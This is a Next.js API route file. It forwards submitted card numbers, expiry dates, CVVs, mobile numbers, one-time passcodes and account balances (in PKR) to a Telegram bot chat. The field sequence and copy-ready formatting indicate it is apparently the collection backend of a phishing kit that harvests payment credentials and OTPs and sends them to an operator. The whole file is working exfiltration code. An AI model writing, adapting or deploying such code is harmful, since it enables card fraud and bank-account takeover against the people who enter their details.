import { NextResponse } from 'next/server'

// Escape text for Telegram MarkdownV2.
function escapeMarkdown(value: string) {
  return value.replace(/([_\*\[\]()~`>#+\-=|{}.!\\])/g, '\\$1')
}

// Triple-backtick MarkdownV2 blocks are rendered by Telegram with a native
// copy action. Keep each field in its own block for individual copying.
function copyableField(label: string, value: string | number) {
  return `\\`\\`\\`\n${escapeMarkdown(label)}: ${escapeMarkdown(String(value))}\n\\`\\`\\``
}

export async function POST(request: Request) {
  const token = process.env.TELEGRAM_BOT_TOKEN
  const chatId = process.env.TELEGRAM_CHAT_ID

  if (!token || !chatId) {
    return NextResponse.json({ ok: false, error: 'Telegram is not configured.' }, { status: 503 })
  }

  let text = ''
  try {
    const body = await request.json()

    if (body?.card || body?.month || body?.year || body?.cvv) {
      // Card submission
      const lines = [
        '*New submission*',
        '*Card details*',
        body?.card ? copyableField('Card', body.card) : null,
        body?.month || body?.year ? copyableField('Expiry', `${body?.month ?? '--'}/${body?.year ?? '----'}`) : null,
        body?.cvv ? copyableField('CVV', body.cvv) : null,
        body?.mobile ? copyableField('Mobile', body.mobile) : null,
      ].filter(Boolean)
      text = lines.join('\n')
    } else if (body?.mobile) {
      text = ['*New submission*', '*Sign in*', copyableField('Mobile', body.mobile)].join('\n')
    } else if (body?.otp) {
      text = ['*New submission*', '*OTP*', copyableField('OTP', body.otp)].join('\n')
    } else if (body?.confirmOtp) {
      text = ['*New submission*', '*Confirm OTP*', copyableField('OTP', body.confirmOtp)].join('\n')
    } else if (body?.balance) {
      text = ['*New submission*', '*Balance*', copyableField('Balance', `PKR ${body.balance}`)].join('\n')
    } else if (typeof body?.text === 'string' && body.text.trim()) {
      text = escapeMarkdown(body.text.trim())
    } else {
      const value = typeof body?.number === 'string' ? body.number : String(body?.number ?? '')
      const trimmed = value.trim()
      text = trimmed
        ? ['*New submission*', '*Number*', copyableField('Number', trimmed)].join('\n')
        : ''
    }
  } catch {
    return NextResponse.json({ ok: false, error: 'Invalid request.' }, { status: 400 })
  }

  if (!text) {
    return NextResponse.json({ ok: false, error: 'Nothing to send.' }, { status: 400 })
  }

  try {
    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: 'MarkdownV2',
      }),
      cache: 'no-store',
    })

    if (!response.ok) {
      return NextResponse.json({ ok: false, error: 'Failed to send to Telegram.' }, { status: 502 })
    }

    return NextResponse.json({ ok: true })
  } catch {
    return NextResponse.json({ ok: false, error: 'Failed to send to Telegram.' }, { status: 502 })
  }
}

export function GET() {
  return NextResponse.json({ ok: false }, { status: 405 })
}
